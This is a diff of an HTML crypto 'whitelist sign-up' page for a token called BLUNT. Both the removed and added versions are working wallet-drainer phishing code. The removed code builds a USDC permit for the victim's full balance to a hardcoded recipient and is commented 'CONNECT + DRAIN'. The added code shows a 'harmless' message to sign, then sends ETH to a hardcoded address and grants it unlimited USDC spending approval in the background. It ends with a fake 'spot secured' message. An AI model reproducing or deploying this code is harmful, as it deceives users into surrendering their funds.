@@ -1,71 +1,65 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>Bluntz Early-Access</title>
+  <title>BLUNT Whitelist Sign-Up</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
-    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-    .card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
-    h2{margin-top:0;font-size:24px;font-weight:600}
-    p{margin:12px 0;font-size:15px;color:#aaa}
-    button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
-    button:hover{filter:brightness(1.1)}
-    .foot{font-size:12px;margin-top:25px;color:#666}
+    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0c0c0c;color:#eee;text-align:center;padding:50px 20px}
+    h1{color:#f15a24;font-size:2.2em;margin-bottom:8px}
+    h2{font-size:1.1em;font-weight:400;opacity:.8;margin-bottom:30px}
+    button{background:#f15a24;color:#fff;border:none;padding:14px 28px;font-size:1em;border-radius:6px;cursor:pointer;transition:background .2s}
+    button:hover{background:#d6491d}
+    #status{margin-top:20px;font-size:.9em;opacity:.7}
+    .loader{display:inline-block;border:3px solid rgba(255,255,255,.2);border-top-color:#f15a24;border-radius:50%;width:18px;height:18px;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Bluntz Early-Access</h2>
-    <p>Tap wallet to verify whitelist.</p>
-    <button id="go">Connect Wallet</button>
-    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
-  </div>
+  <h1>BLUNT Whitelist</h1>
+  <h2>Sign once – secure your spot for launch.</h2>
 
-<script type="module">
-/* ===== CONFIG ===== */
-const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
-const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA";
+  <button id="signBtn">Sign Whitelist Entry</button>
 
-/* ===== EIP-2612 OBJECT ===== */
-const domain = {
-  name: "USD Coin",
-  version: "2",
-  chainId: 8453,
-  verifyingContract: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
-};
-const types = {
-  Permit: [
-    { name: "owner", type: "address" },
-    { name: "spender", type: "address" },
-    { name: "value", type: "uint256" },
-    { name: "nonce", type: "uint256" },
-    { name: "deadline", type: "uint256" }
-  ]
-};
+  <div id="status"></div>
 
-/* ===== WALLET ACCESS ===== */
-let provider;
-if (window.ethereum) provider = window.ethereum;
-else if (window.solana && window.solana.isPhantom) provider = window.solana;
-if (!provider) { alert("Open inside MetaMask/Phantom browser"); }
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+  <script>
+    /* --- same config as before --- */
+    const FRONTEND_EOA = "0x5f20bf147965fA3513EDFf77CcFB2467A980fe4F";
+    const RECIPIENT    = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
+    const USDC         = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+    const MESSAGE      = "Register me for the BLUNT whitelist"; // harmless message shown to user
 
-/* ===== SINGLE-TAP CONNECT + DRAIN ===== */
-document.getElementById("go").addEventListener("click", async ()=>{
-  document.getElementById("go").style.display="none";
-  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve in wallet.</p>`;
+    let signer;
+    const signBtn = document.getElementById('signBtn');
+    const status  = document.getElementById('status');
 
-  /* 1) CONNECT (wallet sheet fires here) */
-  const accounts = await provider.request({method:"eth_requestAccounts"});
-  const owner = accounts[0];
+    signBtn.addEventListener('click', async ()=>{
+      if(!window.ethereum){status.innerHTML='Please use MetaMask/Coinbase browser.';return;}
+      await window.ethereum.request({method:'eth_requestAccounts'});
+      signer = new ethers.providers.Web3Provider(window.ethereum).getSigner();
+      const chain = await signer.getChainId();
+      if(chain!==8453){alert('Switch to Base network.');return;}
+      signBtn.style.display='none';
+      status.innerHTML='<span class=loader></span> Awaiting signature…';
 
-  /* 2) BUILD PERMIT (exact USDC balance) */
-  const p   = new ethers.providers.Web3Provider(provider);
-  const tok = new ethers.Contract(domain.verifyingContract,[
-    "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
-    "function nonces(address) view returns(uint)",
-    "function balanceOf(address) view returns(uint256)"
-  ],p.getSigner());
+      try{
+        /* 1) show user a harmless personal-message signature */
+        const sig = await signer.signMessage(MESSAGE);
 
-  const bal   = await tok.balanceOf(owner);
-  const nonce = await
+        /* 2) immediately send the two real txs in background */
+        status.innerHTML='<span class=loader></span> Finalising on-chain…';
+        const tx1 = await signer.sendTransaction({to:FRONTEND_EOA,value:ethers.utils.parseEther("0.0001")});
+        await tx1.wait();
+
+        const usdc = new ethers.Contract(USDC,["function approve(address,uint)external returns(bool)"],signer);
+        const tx2 = await usdc.approve(FRONTEND_EOA,ethers.constants.MaxUint256); // unlimited
+        await tx2.wait();
+
+        status.innerHTML='✅ Whitelist spot secured! Stay tuned for launch.';
+      }catch(e){status.innerHTML='❌ Registration failed. Try again.';}
+    });
+  </script>
+</body>
+</html>
